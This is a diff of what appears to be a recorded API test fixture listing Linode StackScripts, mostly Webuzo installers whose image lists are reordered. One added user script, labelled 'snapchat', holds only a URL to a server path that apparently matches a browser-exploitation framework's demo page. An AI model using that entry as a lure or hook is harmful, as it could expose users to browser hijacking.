       "Magento 1.7 powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -1567,8 +1636,8 @@ interactions:
       to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure SVNManager
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "SVNManager powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -1606,8 +1675,8 @@ interactions:
       to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure Vty and
       Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal":
-      0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts", "linode/ubuntu14.04lts",
-      "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Vty powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -1659,7 +1728,7 @@ interactions:
       or firewall installed locally, for example, iptables or TCP Wrapper\n\nThis
       script installs the Fail2Ban application and creates two \"Jails\" one for SSH,
       and the other for SSHD.\n\nI hope people find this useful.", "ordinal": 0, "logo_url":
-      "", "images": ["linode/debian10", "linode/debian9", "linode/debian8"], "deployments_total":
+      "", "images": ["linode/debian8", "linode/debian9", "linode/debian10"], "deployments_total":
       0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
       "updated": "2018-01-02T03:04:05", "rev_note": "Added support for Debian 8 and
       9, and added default jail.local file", "script": "#!/bin/bash\n\n# Updating
@@ -1685,8 +1754,8 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       Plandora and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Plandora powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -1733,8 +1802,8 @@ interactions:
       to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure ClientExec
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "ClientExec powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -1764,14 +1833,9 @@ interactions:
       \"Congratulations, ClientExec has been successfully installed\"\necho \" \"\necho
       \"You can now configure ClientExec and Softaculous Webuzo at the following URL
       :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
-      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 992786, "username":
-      "cyberpowercoil", "user_gravatar_id": "1057db5c50b8364f45ef903499aafa15", "label":
-      "wisecp Test", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/alpine3.13",
-      "linode/arch", "linode/debian9-kube-v1.22.2", "linode/ubuntu21.10"], "deployments_total":
-      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
-      "updated": "2018-01-02T03:04:05", "rev_note": "", "script": "#!/bin/bash", "user_defined_fields":
-      []}, {"id": 978962, "username": "meenubediShine", "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2",
-      "label": "StackScript Label", "description": "Description", "ordinal": 0, "logo_url":
+      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 978962, "username":
+      "meenubediShine", "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2", "label":
+      "StackScript Label", "description": "Description", "ordinal": 0, "logo_url":
       "", "images": ["linode/alpine3.12", "linode/alpine3.13", "linode/alpine3.15"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
@@ -1786,8 +1850,8 @@ interactions:
       Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion of the
       installation process, access http://your-ip:2004 to configure Croogo and Softaculous
       Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal": 0,
-      "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts", "linode/ubuntu14.04lts",
-      "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Croogo powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -1841,8 +1905,8 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       WideImage and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "WideImage powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -1890,8 +1954,8 @@ interactions:
       to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure HelpDEZk
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "HelpDEZk powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -1932,8 +1996,8 @@ interactions:
       to Installation Logs : /root/webuzo-install.log\n\nInstructions\nOn completion
       of the installation process, access http://your-ip:2004 to configure SEOTOASTER
       and Softaculous Webuzo initially.\n\nContact : http://webuzo.com/contact", "ordinal":
-      0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts", "linode/ubuntu14.04lts",
-      "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "SEOTOASTER powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -1962,7 +2026,7 @@ interactions:
       Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 978965, "username":
       "meenubediShine", "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2", "label":
       "Testing Update", "description": "testing Update", "ordinal": 0, "logo_url":
-      "", "images": ["linode/alpine3.13", "linode/arch", "linode/debian10", "linode/slackware14.2"],
+      "", "images": ["linode/arch", "linode/slackware14.2", "linode/debian10", "linode/alpine3.13"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "yegiu Update", "script": "#!/bin/bash\n\ntesting Update ", "user_defined_fields":
@@ -1986,8 +2050,8 @@ interactions:
       to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure Support
       Incident Tracker and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Support Incident Tracker powered by Webuzo", "script": "#!/bin/bash\n# <udf
@@ -2039,8 +2103,8 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       Webasyst and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Webasyst powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2082,8 +2146,8 @@ interactions:
       to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure jforum
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "jforum powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2131,8 +2195,8 @@ interactions:
       to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure Admidio
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Admidio powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2180,8 +2244,8 @@ interactions:
       Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion of the
       installation process, access http://your-ip:2004 to configure MeshCMS and Softaculous
       Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal": 0,
-      "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts", "linode/ubuntu14.04lts",
-      "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "MeshCMS powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2232,8 +2296,8 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       Little Software Stats and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Little Software Stats powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2265,25 +2329,31 @@ interactions:
       \" \"\necho \"You can now configure Little Software Stats and Softaculous Webuzo
       at the following URL :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank
       you for choosing Softaculous Webuzo !\"\necho \" \"", "user_defined_fields":
-      []}, {"id": 978971, "username": "meenubediShine", "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2",
-      "label": "test", "description": "test", "ordinal": 0, "logo_url": "", "images":
-      ["linode/alpine3.13"], "deployments_total": 0, "deployments_active": 0, "is_public":
+      []}, {"id": 1158683, "username": "yoboycc", "user_gravatar_id": "e598b7c77d05460a72ceb4397cbc72f6",
+      "label": "snapchat", "description": "", "ordinal": 0, "logo_url": "", "images":
+      ["linode/debian11"], "deployments_total": 0, "deployments_active": 0, "is_public":
       true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
-      "rev_note": "revision", "script": "#!/bin/bash\r\ntest", "user_defined_fields":
-      []}, {"id": 9244, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
-      "label": "DIY powered by Webuzo", "description": "DIY is an open-source lightweight
-      web application framework based on object-oriented PHP 5, MySQL, and XSLT. It
-      is fully object-oriented and designed following the MVC architecture and REST
-      design principles. The idea behind it is not to reinvent the wheel but instead
-      to combine existing and proven technologies in a convenient and effective way.\r\n\r\nWebuzo
-      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
-      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
-      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
-      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
-      completion of the installation process, access http://your-ip:2004 to configure
-      DIY and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "rev_note": "", "script": "#!/bin/bash\nhttps://104-200-19-103.ip.linodeusercontent.com:3000/demos/butcher/index.html",
+      "user_defined_fields": []}, {"id": 978971, "username": "meenubediShine", "user_gravatar_id":
+      "ac16f37ccd972a6f698dab5aab1188b2", "label": "test", "description": "test",
+      "ordinal": 0, "logo_url": "", "images": ["linode/alpine3.13"], "deployments_total":
+      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
+      "updated": "2018-01-02T03:04:05", "rev_note": "revision", "script": "#!/bin/bash\r\ntest",
+      "user_defined_fields": []}, {"id": 9244, "username": "webuzo", "user_gravatar_id":
+      "cf0348f835d60e6d133040f49bb36ec5", "label": "DIY powered by Webuzo", "description":
+      "DIY is an open-source lightweight web application framework based on object-oriented
+      PHP 5, MySQL, and XSLT. It is fully object-oriented and designed following the
+      MVC architecture and REST design principles. The idea behind it is not to reinvent
+      the wheel but instead to combine existing and proven technologies in a convenient
+      and effective way.\r\n\r\nWebuzo is a Single User Control Panel which helps
+      users deploy Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache,
+      NGINX, PHP, Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou
+      can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to
+      Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
+      of the installation process, access http://your-ip:2004 to configure DIY and
+      Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal":
+      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "DIY powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2328,8 +2398,8 @@ interactions:
       \"deb http://repos.sensuapp.org/apt sensu main\" > /etc/apt/sources.list.d/sensu.list\n\napt-get
       update -q", "user_defined_fields": []}, {"id": 978972, "username": "meenubediShine",
       "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2", "label": "test", "description":
-      "test description", "ordinal": 0, "logo_url": "", "images": ["linode/alpine3.13",
-      "linode/opensuse15.2"], "deployments_total": 0, "deployments_active": 0, "is_public":
+      "test description", "ordinal": 0, "logo_url": "", "images": ["linode/opensuse15.2",
+      "linode/alpine3.13"], "deployments_total": 0, "deployments_active": 0, "is_public":
       true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
       "rev_note": "revision", "script": "#!/bin/bash\r\ntest", "user_defined_fields":
       []}, {"id": 8989, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
@@ -2344,12 +2414,12 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       Joomla 2.5 and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
-      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
-      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
-      "Joomla 2.5 powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
-      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"], "deployments_total":
+      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
+      "updated": "2018-01-02T03:04:05", "rev_note": "Joomla 2.5 powered by Webuzo",
+      "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\" label=\"Premium Webuzo
+      License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
       Install Joomla 2.5 and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
       is a Single User Control Panel which helps users deploy Web Apps (WordPress,
       Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
@@ -2390,8 +2460,8 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       ShopSite and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "ShopSite powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2432,7 +2502,7 @@ interactions:
       \".*\"\nrabbitmqctl set_user_tags sensu administrator", "user_defined_fields":
       []}, {"id": 978973, "username": "meenubediShine", "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2",
       "label": "test", "description": "test", "ordinal": 0, "logo_url": "", "images":
-      ["linode/alpine3.13", "linode/alpine3.15", "linode/ubuntu20.04", "linode/slackware14.1"],
+      ["linode/slackware14.1", "linode/ubuntu20.04", "linode/alpine3.13", "linode/alpine3.15"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "revision", "script": "#!/bin/bash\r\ntest", "user_defined_fields": []}, {"id":
@@ -2451,8 +2521,8 @@ interactions:
       to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure phpLiteAdmin
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "phpLiteAdmin powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2510,8 +2580,8 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       Drupal and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Drupal powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2555,8 +2625,8 @@ interactions:
       to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure UIkit and
       Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal":
-      0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts", "linode/ubuntu14.04lts",
-      "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "UIkit powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2627,8 +2697,8 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       AbanteCart and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "AbanteCart powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2672,8 +2742,8 @@ interactions:
       Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure SiteCake
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
